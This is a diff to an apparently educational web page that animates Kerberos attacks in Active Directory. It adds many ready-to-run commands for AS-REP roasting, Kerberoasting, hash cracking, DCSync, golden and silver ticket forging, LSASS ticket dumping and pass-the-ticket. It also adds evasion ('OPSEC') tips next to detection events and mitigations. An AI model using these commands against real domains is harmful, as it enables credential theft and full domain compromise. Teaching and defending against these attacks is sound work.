@@ -685,7 +685,7 @@
 					title: '1. User Initiates Authentication',
 					desc: 'User enters username and password. Client computes NT hash: <code>MD4(UTF-16LE(password))</code>. This hash NEVER leaves the client.',
 					active: 'client',
-					tech: `<b>Local Operations:</b><br>• User enters credentials<br>• NT Hash computed from password<br>• Timestamp encrypted with NT hash for pre-auth`
+					tech: `<b>Local Operations:</b><br>• User enters credentials<br>• NT Hash computed from password<br>• Timestamp encrypted with NT hash for pre-auth<br><br><b>View Current Tickets:</b><br><code>klist</code><br><code>Rubeus.exe triage</code><br><code>Rubeus.exe klist</code>`
 				},
 				{
 					title: '2. AS-REQ → KDC',
@@ -774,46 +774,42 @@
 					title: 'Vulnerability: Pre-Auth Disabled',
 					desc: 'Some accounts have <code>DONT_REQUIRE_PREAUTH</code> flag set. Anyone can request AS-REP without proving identity!',
 					active: 'victim',
-					warning: 'LDAP: <code>(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code>'
+					tech: `<b>🔍 Find Vulnerable Users:</b><br><code># PowerShell (AD Module)</code><br><code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth</code><br><br><code># LDAP Filter</code><br><code>(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</code>`,
+					warning: 'UAC Flag: DONT_REQUIRE_PREAUTH = 0x400000 (4194304)'
 				},
 				{
-					title: '1. Enumerate Vulnerable Users',
-					desc: 'Attacker queries AD for accounts without pre-auth. Can be done with any domain user or sometimes anonymously.',
+					title: '1. Enumerate & Attack',
+					desc: 'Query AD for vulnerable accounts and request AS-REP in one step.',
 					active: 'attacker',
-					tech: `<b>Tools:</b><br>• <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code><br>• <code>Rubeus.exe asreproast /user:all</code><br>• <code>GetNPUsers.py domain/user</code>`
+					tech: `<b>🎯 RUBEUS (Recommended):</b><br><code># All users without pre-auth</code><br><code>Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt</code><br><br><code># Specific user</code><br><code>Rubeus.exe asreproast /user:svc_backup /format:hashcat</code><br><br><code># With domain creds</code><br><code>Rubeus.exe asreproast /creduser:DOMAIN\\user /credpassword:Pass123</code><br><br><code># Request AES (OPSEC - less suspicious)</code><br><code>Rubeus.exe asreproast /format:hashcat /aes</code><br><br><b>📦 IMPACKET (Linux):</b><br><code># With creds</code><br><code>GetNPUsers.py DOMAIN/user:Pass123 -dc-ip 10.10.10.1 -request</code><br><br><code># Without creds (anonymous)</code><br><code>GetNPUsers.py DOMAIN/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass</code><br><br><b>🛡️ OPSEC:</b><br>• Event ID 4768 logged with Pre-Auth type 0<br>• Request AES to blend with normal traffic<br>• Avoid mass-requesting all users at once`
 				},
 				{
 					title: '2. AS-REQ Without Pre-Auth',
 					desc: 'Attacker sends AS-REQ for victim user WITHOUT encrypted timestamp. KDC accepts because pre-auth is disabled.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ (no pre-auth)', type: 'malicious' },
-					packet: { 'padata': '[ EMPTY - No pre-auth! ]', 'cname': 'victim@DOMAIN', 'etype': '[23] ← RC4 preferred' }
+					packet: { 'padata': '[ EMPTY - No pre-auth! ]', 'cname': 'victim@DOMAIN', 'etype': '[23] RC4 or [18] AES256' }
 				},
 				{
 					title: '3. KDC Returns AS-REP',
 					desc: 'KDC returns encrypted data without verifying requester! The enc-part is encrypted with victim\'s password hash.',
 					active: 'kdc',
 					anim: { from: 'kdc', to: 'attacker', label: 'AS-REP (crackable!)', type: 'as-rep' },
-					packet: { 'enc-part': '{ENCRYPTED WITH VICTIM PASSWORD}', '→ This is crackable!': '', 'Contains': 'Session key, nonce, timestamps' }
+					packet: { 'enc-part': '{ENCRYPTED WITH VICTIM PASSWORD}', '→ Crackable!': 'Hash type depends on etype requested', 'Contains': 'Session key, nonce, timestamps' }
 				},
 				{
-					title: '4. Extract Hash',
-					desc: 'Attacker extracts the encrypted portion and formats it for cracking tools.',
+					title: '4. Extract & Crack Hash',
+					desc: 'Extract hash and crack offline with GPU.',
 					active: 'attacker',
-					tech: `<b>Hash Format:</b><br><code>$krb5asrep$23$victim@DOMAIN:...</code><br><br><b>Hashcat mode:</b> 18200`
+					tech: `<b>🔓 HASHCAT:</b><br><code># RC4 (faster to crack)</code><br><code>hashcat -m 18200 asrep.txt wordlist.txt</code><br><br><code># AES256 (slower but OPSEC)</code><br><code>hashcat -m 19700 asrep.txt wordlist.txt</code><br><br><code># With rules</code><br><code>hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule</code><br><br><b>🔓 JOHN:</b><br><code>john --wordlist=rockyou.txt asrep.txt</code><br><br><b>⚡ Hash Format:</b><br><code>$krb5asrep$23$user@DOMAIN:HASH</code><br><br><b>📊 Crack Speed (RTX 3080):</b><br>• RC4: ~2.5 GH/s<br>• AES256: ~250 MH/s`,
+					warning: '⚠️ Weak passwords crack in seconds! 8-char = minutes'
 				},
 				{
-					title: '5. Offline Cracking',
-					desc: 'GPU-accelerated password cracking. No lockouts, no detection, unlimited attempts!',
+					title: '5. Account Compromised!',
+					desc: 'Password obtained. Attacker can now authenticate as victim.',
 					active: 'attacker',
-					tech: `<b>Cracking:</b><br><code>hashcat -m 18200 hash.txt wordlist.txt</code><br><br><b>Speed:</b> ~2.5 billion/sec (RTX 3080, RC4)`,
-					warning: 'Weak passwords crack in seconds!'
-				},
-				{
-					title: '6. Account Compromised!',
-					desc: 'Password obtained. Attacker can now authenticate as victim and access all their resources.',
-					active: 'attacker',
-					warning: 'Mitigations: Enable pre-auth, use 25+ char passwords, disable RC4, monitor Event ID 4768 without pre-auth'
+					tech: `<b>🎭 POST-EXPLOITATION:</b><br><code># Get TGT with recovered password</code><br><code>Rubeus.exe asktgt /user:victim /password:Cracked123 /ptt</code><br><br><code># Or request TGT with hash</code><br><code>Rubeus.exe asktgt /user:victim /rc4:NTHASH /ptt</code><br><br><b>🛡️ DETECTION:</b><br>• Event ID 4768: Pre-Authentication Type = 0<br>• Multiple 4768 from same source<br>• Requests for disabled accounts`,
+					warning: 'Mitigations: Enable pre-auth, 25+ char passwords, disable RC4, monitor 4768 events'
 				}
 			]
 		},
@@ -830,51 +826,40 @@
 					title: 'Target: SPN-Enabled Accounts',
 					desc: 'Any domain user can request service tickets for any SPN. Service tickets are encrypted with the service account\'s hash.',
 					active: 'service',
-					tech: `<b>Why it works:</b><br>• No authorization check for ticket requests<br>• Service accounts often have weak passwords<br>• Passwords rarely changed`
+					tech: `<b>🔍 Find Kerberoastable Accounts:</b><br><code># LDAP Filter</code><br><code>(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))</code><br><br><code># PowerView</code><br><code>Get-DomainUser -SPN | Select samaccountname,serviceprincipalname</code><br><br><code># AD Module</code><br><code>Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName</code>`
 				},
 				{
-					title: '1. Find Kerberoastable Accounts',
-					desc: 'Query AD for user accounts with SPNs registered (excluding krbtgt).',
+					title: '1. Enumerate SPNs',
+					desc: 'Query AD for user accounts with SPNs registered. Rubeus can enumerate and roast in one step.',
 					active: 'attacker',
-					tech: `<b>LDAP:</b> <code>(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt)))</code><br><br><b>Tools:</b> Rubeus, GetUserSPNs.py, BloodHound`
+					tech: `<b>🎯 RUBEUS - Stats First (Recon):</b><br><code># Just enumerate, don't request tickets</code><br><code>Rubeus.exe kerberoast /stats</code><br><br><code># Show only RC4-enabled accounts</code><br><code>Rubeus.exe kerberoast /stats /rc4opsec</code><br><br><b>📦 IMPACKET:</b><br><code>GetUserSPNs.py DOMAIN/user:Pass123 -dc-ip 10.10.10.1</code><br><br><b>🛡️ OPSEC:</b><br>• /stats doesn't request tickets = no 4769 events<br>• Check encryption types before attacking<br>• RC4 accounts = likely older/weaker passwords`
 				},
 				{
-					title: '2. Authenticate (Get TGT)',
-					desc: 'Attacker authenticates normally with compromised domain credentials to get TGT.',
-					active: 'attacker',
-					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ', type: 'as-req' }
-				},
-				{
-					title: '3. Receive TGT',
-					desc: 'Normal TGT received. This allows requesting service tickets.',
-					active: 'kdc',
-					anim: { from: 'kdc', to: 'attacker', label: 'AS-REP', type: 'as-rep' }
-				},
-				{
-					title: '4. Request Service Ticket',
-					desc: 'Request TGS for target SPN. KDC doesn\'t check if requester actually needs the service!',
+					title: '2. Request Service Tickets',
+					desc: 'Request TGS tickets for target SPNs. Can target all or specific accounts.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'kdc', label: 'TGS-REQ (SPN)', type: 'tgs-req' },
-					packet: { 'sname': 'MSSQLSvc/sql01.domain.com:1433', 'etype': '[23] ← RC4 for easy cracking' }
+					tech: `<b>🎯 RUBEUS - Full Attack:</b><br><code># All kerberoastable accounts</code><br><code>Rubeus.exe kerberoast /format:hashcat /outfile:tgs.txt</code><br><br><code># Single user (OPSEC)</code><br><code>Rubeus.exe kerberoast /user:svc_sql /format:hashcat</code><br><br><code># Only RC4 accounts (faster cracking)</code><br><code>Rubeus.exe kerberoast /rc4opsec /format:hashcat</code><br><br><code># Request AES (OPSEC - blends with normal)</code><br><code>Rubeus.exe kerberoast /aes /format:hashcat</code><br><br><code># With alternate creds</code><br><code>Rubeus.exe kerberoast /creduser:DOMAIN\\user /credpassword:Pass123</code><br><br><b>📦 IMPACKET:</b><br><code># All SPNs</code><br><code>GetUserSPNs.py DOMAIN/user:Pass123 -dc-ip 10.10.10.1 -request</code><br><br><code># Target specific SPN</code><br><code>GetUserSPNs.py DOMAIN/user:Pass123 -dc-ip 10.10.10.1 -request-user svc_sql</code><br><br><code># Output to file</code><br><code>GetUserSPNs.py DOMAIN/user:Pass123 -request -outputfile tgs.txt</code><br><br><b>🛡️ OPSEC TIPS:</b><br>• Event ID 4769 logged for each TGS request<br>• Target 1-2 high-value accounts vs mass requests<br>• Request AES tickets to look like normal traffic<br>• Avoid requesting krbtgt or computer accounts`
 				},
 				{
-					title: '5. Receive Service Ticket',
-					desc: 'KDC returns ticket encrypted with service account\'s NT hash. This is what we crack!',
+					title: '3. Receive Service Ticket',
+					desc: 'KDC returns ticket encrypted with service account\'s NT hash. This is crackable!',
 					active: 'kdc',
 					anim: { from: 'kdc', to: 'attacker', label: 'TGS-REP', type: 'tgs-rep' },
-					packet: { 'ticket': '{ENCRYPTED WITH SERVICE HASH}', '→ Crackable offline!': '' }
+					packet: { 'ticket': '{ENCRYPTED WITH SERVICE HASH}', 'etype': 'RC4 (23) or AES256 (18)', '→ Crackable!': 'Offline password cracking' }
 				},
 				{
-					title: '6. Crack Service Ticket',
-					desc: 'Extract ticket hash and crack offline with GPU.',
+					title: '4. Crack Service Ticket',
+					desc: 'Extract ticket hash and crack offline with GPU. No account lockout!',
 					active: 'attacker',
-					tech: `<b>Hashcat:</b> <code>hashcat -m 13100 tgs.txt wordlist</code><br><b>Mode 13100:</b> RC4 | <b>Mode 19700:</b> AES`
+					tech: `<b>🔓 HASHCAT:</b><br><code># RC4 (TGS-REP etype 23)</code><br><code>hashcat -m 13100 tgs.txt wordlist.txt</code><br><br><code># AES256 (TGS-REP etype 18)</code><br><code>hashcat -m 19700 tgs.txt wordlist.txt</code><br><br><code># With rules for mutations</code><br><code>hashcat -m 13100 tgs.txt wordlist.txt -r best64.rule</code><br><br><code># Mask attack (8 char, upper+lower+digit)</code><br><code>hashcat -m 13100 tgs.txt -a 3 ?u?l?l?l?l?l?d?d</code><br><br><b>⚡ Hash Format:</b><br><code>$krb5tgs$23$*user$DOMAIN$SPN*$HASH...</code><br><br><b>📊 Crack Speed (RTX 3080):</b><br>• RC4 (13100): ~800 MH/s<br>• AES256 (19700): ~250 KH/s<br><br><b>🔓 JOHN:</b><br><code>john --wordlist=rockyou.txt --format=krb5tgs tgs.txt</code>`
 				},
 				{
-					title: '7. Service Account Owned!',
-					desc: 'Service accounts often have admin rights on servers or sensitive permissions.',
+					title: '5. Service Account Owned!',
+					desc: 'Password cracked. Service accounts often have elevated privileges.',
 					active: 'attacker',
-					warning: 'Mitigations: gMSA, 25+ char passwords, AES only, least privilege'
+					tech: `<b>🎭 POST-EXPLOITATION:</b><br><code># Get TGT for service account</code><br><code>Rubeus.exe asktgt /user:svc_sql /password:Cracked123 /ptt</code><br><br><code># Check service account privileges</code><br><code>Rubeus.exe asktgt /user:svc_sql /rc4:HASH /ptt</code><br><code>net localgroup administrators</code><br><br><b>💡 Common Privileges:</b><br>• Local admin on servers running the service<br>• Database access (SQL SA)<br>• Constrained delegation permissions<br>• GenericAll on other objects<br><br><b>🛡️ DETECTION:</b><br>• Event ID 4769: Ticket Encryption Type 0x17 (RC4)<br>• High volume of TGS requests from single user<br>• Requests for multiple service accounts<br>• TGS requests for SPNs user never accessed`,
+					warning: 'Mitigations: gMSA, 25+ char random passwords, AES only, monitor 4769 etype 0x17'
 				}
 			]
 		},
@@ -892,27 +877,28 @@
 					title: 'Prerequisites: KRBTGT Hash',
 					desc: 'Attacker has extracted KRBTGT account hash via DCSync, NTDS.dit dump, or DC compromise.',
 					active: 'attacker',
+					tech: `<b>🎯 DCSYNC - Get KRBTGT Hash:</b><br><code># Mimikatz DCSync</code><br><code>mimikatz # lsadump::dcsync /user:krbtgt /domain:corp.local</code><br><br><code># Impacket secretsdump.py</code><br><code>secretsdump.py DOMAIN/admin:Pass@DC01 -just-dc-user krbtgt</code><br><br><b>📋 REQUIRED PRIVS:</b><br>• Replicating Directory Changes<br>• Replicating Directory Changes All<br>• Domain Admin/Enterprise Admin`,
 					warning: 'KRBTGT hash = Keys to entire domain!'
 				},
 				{
 					title: '1. Gather Domain Info',
 					desc: 'Need: KRBTGT hash, Domain SID, Domain name. User can be anything—even non-existent!',
 					active: 'attacker',
-					tech: `<b>Required:</b><br>• KRBTGT NT hash<br>• Domain SID: S-1-5-21-xxx-xxx-xxx<br>• Domain FQDN`
+					tech: `<b>🔍 GET DOMAIN SID:</b><br><code># PowerShell</code><br><code>Get-ADDomain | Select-Object DomainSID</code><br><br><code># Impacket</code><br><code>lookupsid.py DOMAIN/user:pass@DC01</code><br><br><code># From ticket</code><br><code>Rubeus.exe describe /ticket:existing.kirbi</code><br><br><b>📋 REQUIRED INFO:</b><br>• KRBTGT NT hash (or AES256 for OPSEC)<br>• Domain SID: S-1-5-21-xxx-xxx-xxx<br>• Domain FQDN: corp.local`
 				},
 				{
 					title: '2. Forge Golden Ticket',
 					desc: 'Create fake TGT with arbitrary identity and group memberships. Encrypt with KRBTGT hash.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'forged', label: 'Forge TGT', type: 'ticket' },
-					tech: `<code>mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt</code>`,
+					tech: `<b>🎯 RUBEUS - Forge Golden Ticket:</b><br><code># RC4 (detectable)</code><br><code>Rubeus.exe golden /rc4:KRBTGT_HASH /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-xxx /ptt</code><br><br><code># AES256 (OPSEC - preferred)</code><br><code>Rubeus.exe golden /aes256:KRBTGT_AES_KEY /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-xxx /ptt</code><br><br><code># With specific groups</code><br><code>Rubeus.exe golden /aes256:KEY /user:Admin /domain:corp.local /sid:S-1-5-21-xxx /groups:512,519,518,544 /ptt</code><br><br><b>🔧 MIMIKATZ:</b><br><code>kerberos::golden /user:Admin /domain:corp.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt</code><br><br><b>🐧 IMPACKET:</b><br><code>ticketer.py -nthash HASH -domain-sid S-1-5-21-xxx -domain corp.local Admin</code>`,
 					packet: { 'cname': 'FakeAdmin (any name)', 'PAC.Groups': '[512,519,518,544] All admin groups!', 'endtime': '10 years from now', 'encrypted with': 'KRBTGT hash' }
 				},
 				{
 					title: '3. Inject Ticket',
 					desc: 'Golden ticket injected into session. No KDC contact needed for this step!',
 					active: 'attacker',
-					tech: `<b>Pass-the-Ticket:</b><br>• Mimikatz /ptt flag<br>• Rubeus ptt<br>• Export to .kirbi/.ccache`
+					tech: `<b>🎯 RUBEUS - Inject:</b><br><code># Pass-the-Ticket</code><br><code>Rubeus.exe ptt /ticket:golden.kirbi</code><br><br><code># From base64</code><br><code>Rubeus.exe ptt /ticket:doIFxjCC...</code><br><br><b>🔧 MIMIKATZ:</b><br><code>kerberos::ptt golden.kirbi</code><br><br><b>🐧 LINUX (Impacket):</b><br><code>export KRB5CCNAME=/path/to/ticket.ccache</code><br><code>psexec.py -k -no-pass corp.local/Admin@DC01</code><br><br><b>⚠️ OPSEC:</b><br>• Use AES256 encryption (RC4 is flagged)<br>• Match real user RIDs when possible<br>• Avoid 10-year expiry (use realistic lifetime)`
 				},
 				{
 					title: '4. Request Service Tickets',
@@ -936,6 +922,7 @@
 					title: '7. Persistent Domain Compromise',
 					desc: 'Valid for 10 years. Survives password changes, account disabling. Only fix: change KRBTGT password TWICE.',
 					active: 'service',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event ID 4769: Ticket Encryption Type = 0x17 (RC4)<br>• TGT lifetime > 10 hours (default)<br>• Non-existent users in tickets<br>• Unusual group memberships in PAC<br><br><b>🔧 REMEDIATION:</b><br><code># Reset KRBTGT password TWICE</code><br><code>Reset-KrbtgtKeyInteractive.ps1</code><br>• Wait full TGT lifetime between resets<br>• Invalidates all existing TGTs`,
 					warning: 'Must change KRBTGT password twice with TGT lifetime gap between changes!'
 				}
 			]
@@ -953,37 +940,39 @@
 					title: 'Prerequisites: Service Account Hash',
 					desc: 'Obtained via Kerberoasting, LSASS dump, or credential theft. Scope limited to single service.',
 					active: 'attacker',
-					tech: `<b>Golden vs Silver:</b><br>• Golden: KRBTGT hash → all services<br>• Silver: Service hash → that service only<br>• Silver: No DC contact → stealthier!`
+					tech: `<b>🆚 Golden vs Silver:</b><br>• Golden: KRBTGT hash → all services<br>• Silver: Service hash → that service only<br>• Silver: No DC contact → stealthier!<br><br><b>🎯 GET SERVICE HASH:</b><br><code># Kerberoasting</code><br><code>Rubeus.exe kerberoast /user:svc_sql</code><br><br><code># From LSASS (admin on service host)</code><br><code>sekurlsa::logonpasswords</code>`
 				},
 				{
 					title: '1. Gather Service Info',
 					desc: 'Need: Service account hash, SPN, Domain SID.',
 					active: 'attacker',
-					tech: `<b>Common targets:</b><br>• CIFS - File shares<br>• HTTP - Web apps<br>• MSSQLSvc - Databases<br>• HOST - WinRM/PSRemoting`
+					tech: `<b>🔍 COMMON TARGETS & SPNs:</b><br>• <code>CIFS/server</code> - File shares (SMB)<br>• <code>HTTP/server</code> - Web apps, SCCM<br>• <code>MSSQLSvc/server:1433</code> - SQL Server<br>• <code>HOST/server</code> - WinRM, PSRemoting, WMI<br>• <code>LDAP/dc</code> - DCSync capability!<br>• <code>WSMAN/server</code> - PowerShell Remoting<br><br><b>📋 REQUIRED:</b><br>• Service account NT hash or AES key<br>• Domain SID<br>• Target SPN`
 				},
 				{
 					title: '2. Forge Silver Ticket',
 					desc: 'Create fake service ticket with arbitrary PAC. Encrypt with service account hash.',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'forged', label: 'Forge Ticket', type: 'ticket' },
-					tech: `<code>mimikatz # kerberos::golden /user:Admin /domain:corp.local /sid:S-1-5-21-xxx /target:sql01 /service:MSSQLSvc /rc4:HASH /ptt</code>`
+					tech: `<b>🎯 RUBEUS - Forge Silver Ticket:</b><br><code># Basic - CIFS access</code><br><code>Rubeus.exe silver /rc4:SVC_HASH /user:Administrator /service:CIFS/fileserver.corp.local /domain:corp.local /sid:S-1-5-21-xxx /ptt</code><br><br><code># AES256 (OPSEC)</code><br><code>Rubeus.exe silver /aes256:SVC_AES /user:Admin /service:CIFS/server /domain:corp.local /sid:S-1-5-21-xxx /ptt</code><br><br><code># Multiple services (HOST+CIFS)</code><br><code>Rubeus.exe silver /rc4:HASH /user:Admin /service:HOST/server /ldap /ptt</code><br><br><b>🔧 MIMIKATZ:</b><br><code>kerberos::golden /user:Admin /domain:corp.local /sid:S-1-5-21-xxx /target:server.corp.local /service:CIFS /rc4:HASH /ptt</code><br><br><b>🐧 IMPACKET:</b><br><code>ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain corp.local -spn CIFS/server.corp.local Admin</code>`
 				},
 				{
 					title: '3. Access Service Directly',
 					desc: 'Present forged ticket directly to service. NO KDC INVOLVED!',
 					active: 'attacker',
-					anim: { from: 'attacker', to: 'service', label: 'AP-REQ + Silver', type: 'ap-req' }
+					anim: { from: 'attacker', to: 'service', label: 'AP-REQ + Silver', type: 'ap-req' },
+					tech: `<b>🎯 USE THE TICKET:</b><br><code># List shares</code><br><code>dir \\\\server\\c$</code><br><br><code># PSRemoting (with HOST SPN)</code><br><code>Enter-PSSession -ComputerName server</code><br><br><code># SQL (with MSSQLSvc SPN)</code><br><code>sqlcmd -S server -Q "SELECT @@VERSION"</code><br><br><b>⚠️ OPSEC:</b><br>• No 4769 event (no KDC involved)<br>• Only service-level logging<br>• Use AES256 to avoid detection`
 				},
 				{
 					title: '4. Service Validates Ticket',
 					desc: 'Service decrypts ticket (encryption valid), extracts fake PAC with admin groups.',
 					active: 'service',
-					tech: `<b>Why it works:</b><br>• Valid encryption = trusted<br>• Many services skip PAC validation<br>• No DC logs for this access!`
+					tech: `<b>✅ WHY IT WORKS:</b><br>• Valid encryption = trusted<br>• Many services skip PAC validation<br>• No DC logs for this access!<br><br><b>🛡️ DETECTION:</b><br>• Windows Security log on target<br>• Event 4624: Logon Type 3<br>• No corresponding 4769 on DC<br>• PAC validation failures (if enabled)`
 				},
 				{
 					title: '5. Service Compromised',
 					desc: 'Admin access to specific service. Very stealthy—minimal logging.',
 					active: 'service',
+					tech: `<b>🎯 POST-EXPLOITATION:</b><br><code># CIFS - Extract secrets</code><br><code>copy \\\\server\\c$\\windows\\ntds\\ntds.dit .</code><br><br><code># LDAP Silver → DCSync</code><br><code>lsadump::dcsync /domain:corp.local /all</code><br><br><b>🛡️ MITIGATIONS:</b><br>• Enable PAC validation on services<br>• Use gMSA for service accounts<br>• Monitor for 4624 without 4769<br>• Short service account passwords rotation`,
 					warning: 'Mitigations: PAC validation, gMSA, monitor service logs'
 				}
 			]
@@ -1001,37 +990,39 @@
 					title: 'Concept: Ticket Theft',
 					desc: 'Kerberos tickets in memory are authentication tokens. Steal ticket = steal identity.',
 					active: 'victim',
-					tech: `<b>Storage:</b><br>• Windows: LSASS process<br>• Linux: ccache files or KEYRING<br>• No password needed!`
+					tech: `<b>📍 TICKET STORAGE:</b><br>• <b>Windows:</b> LSASS process memory<br>• <b>Linux:</b> /tmp/krb5cc_* or KEYRING<br>• <b>macOS:</b> /tmp/krb5cc_*<br><br><b>✅ KEY ADVANTAGE:</b><br>• No password needed!<br>• Works with smart card users<br>• Works for Protected Users (steal, not forge)`
 				},
 				{
 					title: '1. Compromise Machine',
 					desc: 'Gain local admin on machine where target user has tickets cached.',
 					active: 'attacker',
-					tech: `<b>Scenarios:</b><br>• Admin RDP session<br>• Service account on server<br>• User left session open`
+					tech: `<b>🎯 HIGH-VALUE SCENARIOS:</b><br>• Admin RDP session on server<br>• Service account on multi-user server<br>• Domain Admin logged into workstation<br>• Exchange/SCCM admin sessions<br><br><b>🔍 FIND TARGETS:</b><br><code># Find where users are logged in</code><br><code>Invoke-UserHunter -ShowAll</code><br><code>Get-NetLoggedon -ComputerName server01</code>`
 				},
 				{
 					title: '2. Dump Tickets',
 					desc: 'Extract tickets from LSASS memory.',
 					active: 'attacker',
 					anim: { from: 'victim', to: 'attacker', label: 'Steal Tickets', type: 'malicious' },
-					tech: `<b>Commands:</b><br><code>mimikatz # sekurlsa::tickets /export</code><br><code>Rubeus.exe dump</code>`
+					tech: `<b>🎯 RUBEUS - Dump All Tickets:</b><br><code># Dump all tickets (requires elevation)</code><br><code>Rubeus.exe dump</code><br><br><code># Dump and save to file</code><br><code>Rubeus.exe dump /nowrap</code><br><br><code># Target specific LUID</code><br><code>Rubeus.exe dump /luid:0x123456</code><br><br><code># Dump only TGTs</code><br><code>Rubeus.exe triage</code><br><br><b>🔧 MIMIKATZ:</b><br><code>sekurlsa::tickets /export</code><br><code>kerberos::list /export</code><br><br><b>🐧 LINUX:</b><br><code>cat /tmp/krb5cc_* | base64</code><br><code>klist -k -t</code>`
 				},
 				{
 					title: '3. Inject Stolen Ticket',
 					desc: 'Import victim\'s ticket into attacker\'s session.',
 					active: 'attacker',
-					tech: `<code>mimikatz # kerberos::ptt ticket.kirbi</code><br><code>Rubeus.exe ptt /ticket:BASE64</code>`
+					tech: `<b>🎯 RUBEUS - Pass-the-Ticket:</b><br><code># From base64</code><br><code>Rubeus.exe ptt /ticket:doIFxjCCBc...</code><br><br><code># From .kirbi file</code><br><code>Rubeus.exe ptt /ticket:admin.kirbi</code><br><br><code># Create sacrificial logon session</code><br><code>Rubeus.exe createnetonly /program:cmd.exe /show</code><br><code>Rubeus.exe ptt /ticket:... /luid:0x...</code><br><br><b>🔧 MIMIKATZ:</b><br><code>kerberos::ptt ticket.kirbi</code><br><br><b>🐧 LINUX (ccache):</b><br><code>export KRB5CCNAME=/path/to/ticket.ccache</code><br><br><b>⚠️ OPSEC:</b><br>• Use sacrificial logon to avoid clobbering<br>• Tickets expire (default 10hr)<br>• TGT needed for new service tickets`
 				},
 				{
 					title: '4. Use Victim Identity',
 					desc: 'Access services as the victim user.',
 					active: 'attacker',
-					anim: { from: 'attacker', to: 'service', label: 'AP-REQ (stolen)', type: 'ap-req' }
+					anim: { from: 'attacker', to: 'service', label: 'AP-REQ (stolen)', type: 'ap-req' },
+					tech: `<b>🎯 ACCESS RESOURCES:</b><br><code># Verify ticket</code><br><code>klist</code><br><br><code># Access shares</code><br><code>dir \\\\dc01\\c$</code><br><br><code># PSRemoting</code><br><code>Enter-PSSession -ComputerName dc01</code><br><br><code># Impacket with ticket</code><br><code>export KRB5CCNAME=ticket.ccache</code><br><code>psexec.py -k -no-pass domain/user@target</code>`
 				},
 				{
 					title: '5. Identity Hijacked',
 					desc: 'Full access as victim. If victim is admin → admin access.',
 					active: 'service',
+					tech: `<b>🛡️ DETECTION:</b><br>• Event 4624: Logon with Kerberos<br>• Source IP doesn't match user's workstation<br>• Event 4768/4769 patterns<br><br><b>🛡️ MITIGATIONS:</b><br>• Protected Users group (no delegation)<br>• Credential Guard (protects LSASS)<br>• Short TGT lifetimes (4-10 hours)<br>• Privileged Access Workstations<br>• Tiered admin model`,
 					warning: 'Mitigations: Protected Users group, Credential Guard, short ticket lifetimes'
 				}
 			]
@@ -1049,37 +1040,40 @@
 					title: 'Concept: Hash → Kerberos',
 					desc: 'Convert NTLM hash to Kerberos TGT. Bypasses systems that block NTLM.',
 					active: 'attacker',
-					tech: `<b>Pass-the-Hash:</b> NTLM auth<br><b>Overpass-the-Hash:</b> Use hash to get Kerberos ticket<br>More stealthy, works with Kerberos-only systems`
+					tech: `<b>🆚 PASS-THE-HASH vs OVERPASS:</b><br>• <b>PtH:</b> NTLM auth (blocked by many systems)<br>• <b>Overpass:</b> Use hash → get Kerberos ticket<br><br><b>✅ ADVANTAGES:</b><br>• Works on Kerberos-only systems<br>• More stealthy (Kerberos is expected)<br>• Access to modern features<br>• Bypasses NTLM signing requirements`
 				},
 				{
 					title: '1. Obtain NT Hash',
 					desc: 'Get target user\'s NTLM hash via LSASS dump, DCSync, or SAM extraction.',
 					active: 'attacker',
-					tech: `<b>Sources:</b><br>• <code>sekurlsa::logonpasswords</code><br>• <code>lsadump::dcsync</code><br>• SAM database`
+					tech: `<b>🎯 HASH SOURCES:</b><br><code># Mimikatz LSASS dump</code><br><code>sekurlsa::logonpasswords</code><br><br><code># DCSync specific user</code><br><code>lsadump::dcsync /user:admin</code><br><br><code># SAM database (local)</code><br><code>lsadump::sam</code><br><br><b>🐧 IMPACKET:</b><br><code>secretsdump.py DOMAIN/user:pass@target</code>`
 				},
 				{
 					title: '2. Request TGT with Hash',
 					desc: 'Use NT hash directly for Kerberos pre-authentication (hash IS the key).',
 					active: 'attacker',
 					anim: { from: 'attacker', to: 'kdc', label: 'AS-REQ (hash)', type: 'as-req' },
-					tech: `<code>mimikatz # sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd</code><br><code>Rubeus.exe asktgt /user:admin /rc4:HASH</code>`
+					tech: `<b>🎯 RUBEUS - Request TGT:</b><br><code># RC4 (NT hash)</code><br><code>Rubeus.exe asktgt /user:admin /domain:corp.local /rc4:NTHASH /ptt</code><br><br><code># AES256 (OPSEC - preferred)</code><br><code>Rubeus.exe asktgt /user:admin /domain:corp.local /aes256:AESKEY /ptt</code><br><br><code># Output to file</code><br><code>Rubeus.exe asktgt /user:admin /rc4:HASH /outfile:admin.kirbi</code><br><br><code># Don't inject, just display</code><br><code>Rubeus.exe asktgt /user:admin /rc4:HASH /nowrap</code><br><br><b>🔧 MIMIKATZ (spawns new process):</b><br><code>sekurlsa::pth /user:admin /domain:corp.local /ntlm:HASH /run:cmd.exe</code><br><br><b>🐧 IMPACKET:</b><br><code>getTGT.py -hashes :NTHASH corp.local/admin</code><br><code>export KRB5CCNAME=admin.ccache</code>`
 				},
 				{
 					title: '3. Receive Valid TGT',
 					desc: 'KDC validates pre-auth (can\'t tell hash was used directly) and issues TGT.',
 					active: 'kdc',
-					anim: { from: 'kdc', to: 'attacker', label: 'AS-REP + TGT', type: 'as-rep' }
